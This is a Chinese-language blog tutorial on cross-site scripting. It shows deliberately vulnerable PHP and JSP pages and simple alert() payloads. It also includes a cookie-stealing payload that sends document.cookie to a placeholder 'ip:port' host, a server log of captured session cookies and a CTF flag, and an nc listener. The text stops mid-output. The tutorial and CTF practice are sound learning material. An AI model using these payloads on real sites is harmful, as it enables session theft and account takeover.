<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='0x01 前言 最近发现xss的利用还是挺多的，但是自己又处于一个只会用低级payload的水平,所以来学习一下\n0x02 question what‘s this 原理 原理就是很简单，类似于注入，我们插入了恶意代码在网页中，并且也被成功解析了\n利用场景 浏览器可以执行JavaScript代码（这不是废话吗）。 网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等。 那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个"互",所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)\n干啥 窃取cookie或token来获得用户登录态； 劫持流量，把用户正在访问的页面跳转到钓鱼网站； 盗用账户来转账、群发信息等； 利用用户的设备来发起DDOS攻击； demo 这次我们从一个最简单的demo来看看原理\n1 2 3 <?php $xss=$_GET[&#39;id&#39;]; echo $xss; 1 ?id=<script>alert(1)</script> 直接就出现弹窗了，也就是因为我们的恶意代码被解析插入，这样子看其实还是不是很能理解，再来个demo，这个demo也就花了我两个小时吧，艹想哭了\n为了更加直观的看到为什么会造成xss，我零基础学了如果使用Tomcat来搭建一个本地服务，其中载入jsp漏洞代码，即可进行xss测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%> <!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>XSS 测试页面</title> </head> <body> <h1>XSS 测试页面</h1> <form action="xss_test.jsp" method="get"> <label for="message">输入消息:</label> <input type="text" id="message" name="message" value="<%= request.getParameter("message") == null ? "" : request.getParameter("message") %>"> <button type="submit">提交</button> </form> <div> 您输入的消息是：<%= request.getParameter("message") == null ? "null" : request.getParameter("message") %> </div> </body> </html> 先简单的写个xss_test.jsp直接用来测试的\n'><title>深入浅出XSS</title><link rel=canonical href=https://baozongwi.xyz/p/xss-in-depth/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="深入浅出XSS"><meta property='og:description' content='0x01 前言 最近发现xss的利用还是挺多的，但是自己又处于一个只会用低级payload的水平,所以来学习一下\n0x02 question what‘s this 原理 原理就是很简单，类似于注入，我们插入了恶意代码在网页中，并且也被成功解析了\n利用场景 浏览器可以执行JavaScript代码（这不是废话吗）。 网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等。 那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个"互",所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)\n干啥 窃取cookie或token来获得用户登录态； 劫持流量，把用户正在访问的页面跳转到钓鱼网站； 盗用账户来转账、群发信息等； 利用用户的设备来发起DDOS攻击； demo 这次我们从一个最简单的demo来看看原理\n1 2 3 <?php $xss=$_GET[&#39;id&#39;]; echo $xss; 1 ?id=<script>alert(1)</script> 直接就出现弹窗了，也就是因为我们的恶意代码被解析插入，这样子看其实还是不是很能理解，再来个demo，这个demo也就花了我两个小时吧，艹想哭了\n为了更加直观的看到为什么会造成xss，我零基础学了如果使用Tomcat来搭建一个本地服务，其中载入jsp漏洞代码，即可进行xss测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%> <!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>XSS 测试页面</title> </head> <body> <h1>XSS 测试页面</h1> <form action="xss_test.jsp" method="get"> <label for="message">输入消息:</label> <input type="text" id="message" name="message" value="<%= request.getParameter("message") == null ? "" : request.getParameter("message") %>"> <button type="submit">提交</button> </form> <div> 您输入的消息是：<%= request.getParameter("message") == null ? "null" : request.getParameter("message") %> </div> </body> </html> 先简单的写个xss_test.jsp直接用来测试的\n'><meta property='og:url' content='https://baozongwi.xyz/p/xss-in-depth/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='xss'><meta property='article:tag' content='姿势'><meta property='article:published_time' content='2024-09-25T08:04:23+00:00'><meta property='article:modified_time' content='2024-09-25T08:04:23+00:00'><meta name=twitter:title content="深入浅出XSS"><meta name=twitter:description content='0x01 前言 最近发现xss的利用还是挺多的，但是自己又处于一个只会用低级payload的水平,所以来学习一下\n0x02 question what‘s this 原理 原理就是很简单，类似于注入，我们插入了恶意代码在网页中，并且也被成功解析了\n利用场景 浏览器可以执行JavaScript代码（这不是废话吗）。 网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等。 那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个"互",所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)\n干啥 窃取cookie或token来获得用户登录态； 劫持流量，把用户正在访问的页面跳转到钓鱼网站； 盗用账户来转账、群发信息等； 利用用户的设备来发起DDOS攻击； demo 这次我们从一个最简单的demo来看看原理\n1 2 3 <?php $xss=$_GET[&#39;id&#39;]; echo $xss; 1 ?id=<script>alert(1)</script> 直接就出现弹窗了，也就是因为我们的恶意代码被解析插入，这样子看其实还是不是很能理解，再来个demo，这个demo也就花了我两个小时吧，艹想哭了\n为了更加直观的看到为什么会造成xss，我零基础学了如果使用Tomcat来搭建一个本地服务，其中载入jsp漏洞代码，即可进行xss测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%> <!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>XSS 测试页面</title> </head> <body> <h1>XSS 测试页面</h1> <form action="xss_test.jsp" method="get"> <label for="message">输入消息:</label> <input type="text" id="message" name="message" value="<%= request.getParameter("message") == null ? "" : request.getParameter("message") %>"> <button type="submit">提交</button> </form> <div> 您输入的消息是：<%= request.getParameter("message") == null ? "null" : request.getParameter("message") %> </div> </body> </html> 先简单的写个xss_test.jsp直接用来测试的\n'><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#whats-this>what‘s this</a><ol><li><a href=#原理>原理</a></li><li><a href=#利用场景>利用场景</a></li><li><a href=#干啥>干啥</a></li><li><a href=#demo>demo</a></li><li><a href=#分析payload>分析payload</a></li></ol></li><li><a href=#xss利用>xss利用</a><ol><li><a href=#获取>获取</a></li><li><a href=#反射>反射</a></li><li><a href=#存储>存储</a></li><li><a href=#dom>DOM</a></li><li><a href=#异步xss>异步xss</a></li></ol></li><li><a href=#demo我觉得可以做做>demo(我觉得可以做做)</a><ol><li><a href=#buu-xss-course-1>BUU XSS COURSE 1</a></li><li><a href=#第二章-web进阶xss闯关>[第二章 web进阶]XSS闯关</a></li><li></li></ol></li><li><a href=#bypass>bypass</a><ol><li><a href=#html标签>HTML标签</a></li><li><a href=#html属性>HTML属性</a></li><li><a href=#利用unicode>利用Unicode</a></li><li><a href=#闭合>闭合</a></li><li><a href=#payload解释>payload解释</a></li><li><a href=#大小写>大小写</a></li><li><a href=#绕过空格>绕过空格</a></li><li><a href=#嵌套>嵌套</a></li></ol></li><li><a href=#fix>fix</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/xss-in-depth/>深入浅出XSS</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2024-09-25T08:04:23Z>Sep 25, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 508 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>最近发现<code>xss</code>的利用还是挺多的，但是自己又处于一个只会用低级<code>payload</code>的水平,所以来学习一下</p><h1 id=0x02-question>0x02 question</h1><h2 id=whats-this>what‘s this</h2><h3 id=原理>原理</h3><p><img src=/p/xss-in-depth/QQ20240925-135455.png width=592 height=336 loading=lazy alt=1></p><p>原理就是很简单，类似于注入，我们插入了恶意代码在网页中，并且也被成功解析了</p><h3 id=利用场景>利用场景</h3><blockquote><ol><li>浏览器可以执行JavaScript代码（这不是废话吗）。</li><li>网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等。</li></ol></blockquote><p>那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个"互",所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)</p><h3 id=干啥>干啥</h3><ul><li>窃取<a class=link href="https://blog.oonne.com/site/blog?id=31" target=_blank rel=noopener>cookie</a>或<a class=link href="https://blog.oonne.com/site/blog?id=43" target=_blank rel=noopener>token</a>来获得用户登录态；</li><li>劫持流量，把用户正在访问的页面跳转到钓鱼网站；</li><li>盗用账户来转账、群发信息等；</li><li>利用用户的设备来发起DDOS攻击；</li></ul><h3 id=demo>demo</h3><p>这次我们从一个最简单的<code>demo</code>来看看原理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$xss</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$xss</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=&lt;script&gt;alert(1)&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>直接就出现弹窗了，也就是因为我们的恶意代码被解析插入，这样子看其实还是不是很能理解，再来个<code>demo</code>，这个<code>demo</code>也就花了我两个小时吧，艹想哭了</p><p>为了更加直观的看到为什么会造成<code>xss</code>，我零基础学了如果使用<code>Tomcat</code>来搭建一个本地服务，其中载入<code>jsp</code>漏洞代码，即可进行<code>xss</code>测试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=UTF-8&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html lang=&#34;zh-CN&#34;&gt;
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;XSS 测试页面&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;h1&gt;XSS 测试页面&lt;/h1&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;form action=&#34;xss_test.jsp&#34; method=&#34;get&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;label for=&#34;message&#34;&gt;输入消息:&lt;/label&gt;
</span></span><span class=line><span class=cl>    &lt;input type=&#34;text&#34; id=&#34;message&#34; name=&#34;message&#34; value=&#34;&lt;%= request.getParameter(&#34;message&#34;) == null ? &#34;&#34; : request.getParameter(&#34;message&#34;) %&gt;&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;button type=&#34;submit&#34;&gt;提交&lt;/button&gt;
</span></span><span class=line><span class=cl>&lt;/form&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;div&gt;
</span></span><span class=line><span class=cl>    您输入的消息是：&lt;%= request.getParameter(&#34;message&#34;) == null ? &#34;null&#34; : request.getParameter(&#34;message&#34;) %&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>先简单的写个<code>xss_test.jsp</code>直接用来测试的</p><p>我们直接在输入框中输入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;XSS&#39;</span><span class=p>);&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>发现弹窗成功，再查看代码发现原来变成了这样</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html lang=&#34;zh-CN&#34;&gt;
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;XSS 测试页面&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;h1&gt;XSS 测试页面&lt;/h1&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;form action=&#34;xss_test.jsp&#34; method=&#34;get&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;label for=&#34;message&#34;&gt;输入消息:&lt;/label&gt;
</span></span><span class=line><span class=cl>    &lt;input type=&#34;text&#34; id=&#34;message&#34; name=&#34;message&#34; value=&#34;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;button type=&#34;submit&#34;&gt;提交&lt;/button&gt;
</span></span><span class=line><span class=cl>&lt;/form&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;div&gt;
</span></span><span class=line><span class=cl>    您输入的消息是：&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>也就是说我们插入的恶意代码被直接放进了源码之中解析</p><h3 id=分析payload>分析payload</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script&gt;alert(1)&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p><code>alert</code>:是<code>JavaScript </code>中的一个内置函数,用于显示一个警告对话框。</p><p><code>&lt;script></code>:是HTML 中的一个标签，用于定义客户端脚本（如 JavaScript）。</p><p>标签也就是执行的原因</p><h2 id=xss利用>xss利用</h2><p><code>html</code>标签什么应该都知道吧(~~~不知道就寄寄~~),本身<code>xss</code>又分为三种类型,<strong>反射型，存储型，基于DOM的xss</strong></p><h3 id=获取>获取</h3><p>首先来讲讲获取手法吧，因为这个之前是困扰了我很久的</p><p>使用的<code>payload</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>body</span> <span class=n>onload</span><span class=o>=</span><span class=s2>&#34;window.open(&#39;http://ip:port/&#39;+document.cookie)&#34;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>使用<code>Python</code>开启<code>web</code>服务,打入<code>payload</code>即可一直接收</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 -m http.server 9999
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>124.223.158.81 - - [25/Sep/2024 06:17:11] &#34;GET /PHPSESSID=5el9lo449uj38irou4flmjnk77;%20flag=ctfshow%7B8f2ded97-e98b-4a2e-b771-358d90420962%7D HTTP/1.1&#34; 404 -
</span></span><span class=line><span class=cl>124.223.158.81 - - [25/Sep/2024 06:17:22] code 404, message File not found
</span></span><span class=line><span class=cl>124.223.158.81 - - [25/Sep/2024 06:17:22] &#34;GET /PHPSESSID=le32vkvgl7g694rhkoerirpiig;%20flag=ctfshow%7B8f2ded97-e98b-4a2e-b771-358d90420962%7D HTTP/1.1&#34; 404 -
</span></span></code></pre></td></tr></table></div></div><p>直接监听</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>root</span><span class=err>@</span><span class=n>dkcjbRCL8kgaNGz</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=c1># nc -lvnp 9999</span>
</span></span><span class=line><span class=cl><span class=n>Listening</span> <span class=n>on</span> <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span> <span class=n>received</span> <span class=n>on</span> <span class=mf>124.223</span><span class=o>.</span><span class=mf>158.81</span> <span class=mi>49214</span>
